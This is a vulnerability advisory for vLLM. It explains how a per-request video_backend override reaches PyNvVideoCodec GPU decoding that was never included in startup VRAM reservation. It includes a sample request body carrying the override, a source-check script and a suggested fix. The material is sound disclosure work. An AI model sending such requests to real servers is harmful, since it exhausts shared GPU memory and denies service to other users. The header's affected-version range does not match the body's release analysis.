@@ -1,0 +1,241 @@
+PYSEC-2026-4178 PyPI/vllm — vLLM: Request-selected PyNvVideoCodec GPU decode bypasses static VRAM reservation
+package: vllm
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.28.0 (ECOSYSTEM)
+aliases: CVE-2026-69147, GHSA-8pw2-6jv3-mj5j
+references:
+  https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j
+  https://nvd.nist.gov/vuln/detail/CVE-2026-69147
+  https://github.com/vllm-project/vllm/pull/47259
+  https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda
+  https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d
+  https://github.com/vllm-project/vllm
+  https://github.com/vllm-project/vllm/releases/tag/v0.25.0
+  https://pypi.org/project/vllm
+  https://github.com/advisories/GHSA-8pw2-6jv3-mj5j
+
+## Summary
+
+Current vLLM `main` lets an inference request choose the PyNvVideoCodec GPU video decoder through `media_io_kwargs.video.video_backend`, but engine GPU memory reservation is computed only from static startup configuration and `VLLM_VIDEO_LOADER_BACKEND`. If the server starts with the default OpenCV/software backend and no `--mm-ipc-gpu-memory-gb` budget, a client can still route a video request into the PyNvVideoCodec path after startup, causing frontend CUDA-context, decoder-surface, and decoded-frame GPU allocations that were not carved out of the engine KV-cache budget.
+
+## Technical Details
+
+The vulnerable boundary is the split between request-time media decoding choices in the API server and startup-time memory budgeting in the engine worker. Request bodies for Chat Completions and Responses expose `media_io_kwargs`, and those values are forwarded to the shared media connector. For video inputs, `MediaConnector.fetch_video()` copies `self.media_io_kwargs["video"]` into `video_io_kwargs`, only setting a model-derived backend when `video_backend` is absent. `VideoMediaIO.__init__()` then consumes `video_backend` from those kwargs and loads that backend from `VIDEO_LOADER_REGISTRY`.
+
+The relevant request-side source path is:
+
+```python
+video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))
+if "video_backend" not in video_io_kwargs and (
+    video_backend := get_video_loader_backend_for_processor(video_processor)
+):
+    video_io_kwargs["video_backend"] = video_backend
+video_io = VideoMediaIO(image_io, **video_io_kwargs)
+```
+
+```python
+video_loader_backend = (
+    kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND
+)
+self.video_loader = VIDEO_LOADER_REGISTRY.load(video_loader_backend)
+```
+
+`VideoBackend.load_bytes()` then dispatches `backend == "pynvvideocodec"` into `decode_frames_pynvvideocodec()`, which constructs a PyNvVideoCodec decoder, creates or uses a CUDA stream, reads stream metadata, decodes selected frames on the GPU, and copies those frames into pinned host memory. The new frontend GPU memory pool accounts only for raw decoded frame bytes when a pool exists; it does not make request-time backend selection safe when no startup reservation was made.
+
+The engine-side reservation code makes its decision from static model config and environment only:
+
+```python
+def _uses_pynvvideocodec_video_backend(mm_config) -> bool:
+    video_kwargs = mm_config.media_io_kwargs.get("video", {})
+    video_loader_backend = (
+        video_kwargs.get("video_backend") or envs.VLLM_VIDEO_LOADER_BACKEND
+    )
+    codec_backend = video_kwargs.get("backend")
+    return (
+        video_loader_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
+        or codec_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
+    )
+```
+
+```python
+decoder_reserved_bytes = (
+    num_api_servers * per_server_decoder_bytes
+    if self._uses_pynvvideocodec_video_backend(mm_config)
+    else 0
+)
+reserved_bytes = raw_frame_reserved_bytes + decoder_reserved_bytes
+if reserved_bytes <= 0:
+    return available_kv_cache_memory_bytes
+```
+
+With default static video configuration, `mm_config.media_io_kwargs["video"]` does not name PyNvVideoCodec and `VLLM_VIDEO_LOADER_BACKEND` defaults to OpenCV/software decoding. The worker therefore reserves no PyNv decoder/CUDA-context bytes. A later request can still set `media_io_kwargs.video.video_backend="pynvvideocodec"` and reach the GPU decoder path because that runtime field is intentionally honored by `VideoMediaIO`.
+
+## PoV
+
+An ordinary multimodal inference request can carry the backend override in the request body:
+
+```json
+{
+  "model": "served-vlm",
+  "messages": [
+    {
+      "role": "user",
+      "content": [
+        {"type": "text", "text": "summarize this clip"},
+        {"type": "video_url", "video_url": {"url": "data:video/mp4;base64,<small-mp4>"}}
+      ]
+    }
+  ],
+  "media_io_kwargs": {
+    "video": {
+      "video_backend": "pynvvideocodec"
+    }
+  }
+}
+```
+
+The following bounded source-level check confirms the code path without allocating GPU memory:
+
+```bash
+git clone --filter=blob:none https://github.com/vllm-project/vllm.git
+cd vllm
+git checkout ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a
+python3 check_pynv_backend_reservation.py --repo .
+```
+
+## PoC
+
+The bounded check validates current source markers, simulates the exact static reservation predicate, and compares vulnerable and negative-control configurations. Key output:
+
+```json
+{
+  "vulnerable": true,
+  "head": "ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a",
+  "reservation_simulation": {
+    "env_video_loader_backend": "opencv",
+    "request_selects_pynv_after_startup": true,
+    "vulnerable_static_reserved_bytes": 0,
+    "negative_control_static_pynv_reserved_bytes": 2066953011,
+    "raw_frame_only_control_reserved_bytes": 268435456,
+    "unreserved_decoder_bytes_when_only_request_selects_pynv": 2066953011
+  }
+}
+```
+
+The negative control is important: when PyNvVideoCodec is selected statically, the worker reserves `2066953011` bytes per API process for decoder surfaces plus CUDA context. The vulnerable case reserves `0` bytes for the same decoder overhead because PyNvVideoCodec is selected only by the later request. A second control with static OpenCV plus `mm_ipc_gpu_memory_gb=0.25` reserves only the raw-frame semaphore budget and still does not reserve PyNv decoder/CUDA-context bytes.
+
+## Impact
+
+An attacker who can submit video requests to a vLLM deployment with PyNvVideoCodec available can force frontend GPU decoding even when the engine did not reserve memory for that decoder during startup. On high-utilization serving deployments, the unreserved CUDA context, retained decoder surfaces, and decoded-frame allocations can reduce or exhaust GPU memory that the engine assumed was available for weights, activations, or KV cache, causing request failures, worker crashes, or service-level denial of service.
+
+Suggested severity is Medium with conservative CVSS v3.1 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (6.5). If a deployment exposes the affected API without authentication, `PR:N` would raise the deployment-specific score. Suggested weaknesses are `CWE-770` (Allocation of Resources Without Limits or Throttling) and `CWE-400` (Uncontrolled Resource Consumption). This should not be rated Low because the affected resource is shared GPU memory in the serving path and the code already treats the PyNv decoder/CUDA-context footprint as large enough to reserve at startup when statically configured.
+
+Limitations: exploitation requires a GPU deployment where PyNvVideoCodec is installed and usable, and the request must reach a video-capable model/path. The issue does not claim code execution, data disclosure, or SSRF.
+
+## Suggested Fix
+
+Do not allow untrusted request fields to select a GPU decoder that was not included in startup memory reservation. The simplest fix is to reject request-level `media_io_kwargs.video.video_backend="pynvvideocodec"` unless the static server configuration already selected PyNvVideoCodec and reserved its decoder/CUDA-context budget.
+
+If dynamic backend selection remains supported, split software and GPU decoder policies: allow request selection among CPU/software decoders only, require an explicit operator allowlist for GPU decoders, and include every request-selectable GPU decoder in the startup reservation predicate. Add regression coverage for static OpenCV startup config plus request-level PyNvVideoCodec override, and preserve the negative control where static PyNvVideoCodec configuration reserves decoder/CUDA-context bytes.
+
+## Affected Package/Versions
+
+Package: `vllm` from `vllm-project/vllm`.
+
+Confirmed affected: current `main` at `ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a`.
+
+Introduced by: `af16446bf39de047ab57649c933063cf1cbf1e50`, `Vram semaphore infra (#44465)`, committed 2026-06-26T17:32:51-07:00.
+
+Release status checked: `git tag --contains af16446bf` returned no release tags in the fresh checkout. GitHub repository metadata reported latest published release `v0.23.0` published 2026-06-15T05:27:20Z; the local `v0.24.0` tag also does not contain the introducing commit. The affected range should therefore be current `main` builds containing `af16446bf` until fixed, rather than a confirmed released-version range.
+
+## Advisory History
+
+Public vLLM advisories checked included audio decompression-bomb DoS, unbounded `video/jpeg` frame-count DoS, MediaConnector SSRF, video processing RCE, multimodal embedding DoS/RCE, GGUF GPU memory exposure, multimodal hashing, and other request-parameter DoS classes. None matched request-selected PyNvVideoCodec or the static VRAM reservation mismatch.
+
+Prior local/private vLLM report families checked included request-level `media_io_kwargs` reopening `video/jpeg` frame fanout, GLM video metadata amplification, and audio media decode duration-limit bypass. Those reports share the request-level media kwargs boundary, but they target CPU/media decode limits or model metadata amplification. This report targets a different privileged asset and fix surface: GPU decoder selection after engine startup memory reservation.
+
+Focused GitHub issue/PR searches for `pynvvideocodec`, `mm_ipc_gpu_memory`, `video_backend media_io_kwargs`, `Vram semaphore infra`, and `frontend multimodal GPU decoding` found the PyNvVideoCodec zero-copy RFC, an old do-not-review prototype, merged PR `#44465`, and an unrelated TorchCodec backend PR. No public issue or PR described this security boundary.
+
+## Appendix: Bounded Source-Level Check
+
+```python
+#!/usr/bin/env python3
+from __future__ import annotations
+
+import argparse
+import json
+import re
+import subprocess
+from pathlib import Path
+
+MIB = 1024 * 1024
+GIB = 1024 * MIB
+
+def read(repo: Path, rel: str) -> str:
+    return (repo / rel).read_text(encoding="utf-8")
+
+def const_int(source: str, name: str) -> int:
+    expr = re.search(rf"^{name}\s*=\s*(.+)$", source, flags=re.MULTILINE).group(1).strip()
+    if expr == "128 * MiB_bytes":
+        return 128 * MIB
+    if expr == "int(1.8 * 1024 * MiB_bytes)":
+        return int(1.8 * 1024 * MIB)
+    if expr == "1":
+        return 1
+    raise AssertionError(expr)
+
+def uses_pynv_static(static_media_io_kwargs: dict[str, dict[str, str]], env_backend: str) -> bool:
+    video_kwargs = static_media_io_kwargs.get("video", {})
+    video_loader_backend = video_kwargs.get("video_backend") or env_backend
+    codec_backend = video_kwargs.get("backend")
+    return video_loader_backend == "pynvvideocodec" or codec_backend == "pynvvideocodec"
+
+def reserve_bytes(static_media_io_kwargs, env_backend, mm_ipc_gpu_memory_gb, decoder_bytes, cuda_context_bytes, retained_decoders):
+    raw_frame_reserved_bytes = int(mm_ipc_gpu_memory_gb * GIB)
+    per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes
+    decoder_reserved_bytes = per_server_decoder_bytes if uses_pynv_static(static_media_io_kwargs, env_backend) else 0
+    return raw_frame_reserved_bytes + decoder_reserved_bytes
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--repo", required=True, type=Path)
+repo = parser.parse_args().repo.resolve()
+
+media_video = read(repo, "vllm/multimodal/media/video.py")
+connector = read(repo, "vllm/multimodal/media/connector.py")
+chat_protocol = read(repo, "vllm/entrypoints/openai/chat_completion/protocol.py")
+responses_protocol = read(repo, "vllm/entrypoints/openai/responses/protocol.py")
+gpu_worker = read(repo, "vllm/v1/worker/gpu_worker.py")
+video_core = read(repo, "vllm/multimodal/video.py")
+
+assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in chat_protocol
+assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in responses_protocol
+assert 'video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))' in connector
+assert 'if "video_backend" not in video_io_kwargs and (' in connector
+assert 'kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND' in media_video
+assert "elif backend == PYNVVIDEOCODEC_VIDEO_BACKEND:" in video_core
+assert 'video_kwargs = mm_config.media_io_kwargs.get("video", {})' in gpu_worker
+
+decoder_bytes = const_int(video_core, "PYNVVIDEOCODEC_DECODER_GPU_MEMORY_BYTES")
+retained_decoders = const_int(video_core, "PYNVVIDEOCODEC_MAX_RETAINED_DECODERS")
+cuda_context_bytes = const_int(video_core, "PYNVVIDEOCODEC_CUDA_CONTEXT_BYTES")
+per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes
+
+vulnerable_static_reserved = reserve_bytes({}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
+negative_control_reserved = reserve_bytes({"video": {"video_backend": "pynvvideocodec"}}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
+raw_frame_only_control = reserve_bytes({}, "opencv", 0.25, decoder_bytes, cuda_context_bytes, retained_decoders)
+
+head = subprocess.check_output(["git", "-C", str(repo), "rev-parse", "HEAD"], text=True).strip()
+print(json.dumps({
+    "head": head,
+    "vulnerable": vulnerable_static_reserved == 0 and negative_control_reserved == per_server_decoder_bytes,
+    "reservation_simulation": {
+        "env_video_loader_backend": "opencv",
+        "request_selects_pynv_after_startup": True,
+        "vulnerable_static_reserved_bytes": vulnerable_static_reserved,
+        "negative_control_static_pynv_reserved_bytes": negative_control_reserved,
+        "raw_frame_only_control_reserved_bytes": raw_frame_only_control,
+        "unreserved_decoder_bytes_when_only_request_selects_pynv": per_server_decoder_bytes,
+    },
+}, indent=2, sort_keys=True))
+```
